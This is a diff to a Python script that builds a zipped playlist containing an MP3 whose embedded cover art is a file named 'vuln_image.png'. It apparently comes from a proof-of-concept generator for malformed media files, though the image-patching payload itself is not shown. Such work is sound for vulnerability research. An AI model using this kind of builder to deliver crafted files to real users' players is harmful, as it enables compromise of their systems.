@@ -1,17 +1,26 @@
-from pydub import AudioSegment
 import os.path
 import shutil
 import sys
 from PIL import Image
+import eyed3
+import eyed3.plugins
 from PIL.PngImagePlugin import PngInfo
 
 
-def create_track(track_name, image_path, tags):
-    proto_track = AudioSegment.from_mp3("proto_track.mp3")
-    proto_track.export(
-        os.path.curdir + f"/{track_name}", format="mp3", tags=tags,
-        parameters=["-i", os.path.curdir + "/" + image_path]
-    )
+def create_track_fix(track_name, image_path, tags):
+    shutil.copy("proto_track.mp3", track_name)
+    mp3file = eyed3.load(track_name)
+
+    if mp3file.tag is None:
+        mp3file.initTag()
+
+    with open(image_path, 'rb') as img:
+        img_bytes = img.read()
+
+    mp3file.tag.album = ""
+    mp3file.tag.artist = tags["artist"]
+    mp3file.tag.images.set(3, img_bytes, 'image/png')
+    mp3file.tag.save()
 
 
 def patch_image():
@@ -38,7 +47,7 @@ def create_playlist_file(path_for_playlist):
 
     os.mkdir(str(playlist_dir))
 
-    create_track(f"{playlist_dir}/track1.mp3", "vuln_image.png", tag)
+    create_track_fix(f"{playlist_dir}/track1.mp3", "vuln_image.png", tag)
     shutil.copy("proto_playlist.m3u", f"{playlist_dir}/playlist.m3u")
     shutil.make_archive(f"{playlist_dir}", "zip", str(playlist_dir))
     shutil.rmtree(str(playlist_dir))
